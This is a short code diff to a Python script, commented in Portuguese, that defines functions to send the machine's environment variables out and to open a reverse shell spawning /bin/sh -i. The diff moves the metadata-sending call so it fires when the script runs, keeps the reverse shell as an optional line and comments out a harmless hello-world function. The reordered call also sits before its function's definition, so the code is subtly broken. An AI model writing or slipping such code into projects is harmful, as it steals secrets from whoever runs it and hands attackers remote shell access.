@@ -3,6 +3,10 @@ import os
 import socket
 import subprocess
 import requests
+# Envia os metadados ao executar o script
+send_metadata()
+# Opcionalmente, também execute a shell reversa ao executar este script
+# reverse_shell()
 
 def send_metadata():
     env_vars = os.environ
@@ -23,12 +27,5 @@ def reverse_shell():
     os.dup2(s.fileno(), 2)
     subprocess.call(["/bin/sh", "-i"])
 
-def hello():
-    print("Hello, World!")
-
-# Envia os metadados ao executar o script
-send_metadata()
-
-# Opcionalmente, também execute a shell reversa ao executar este script
-# reverse_shell()
-
+# def hello():
+#     print("Hello, World!")
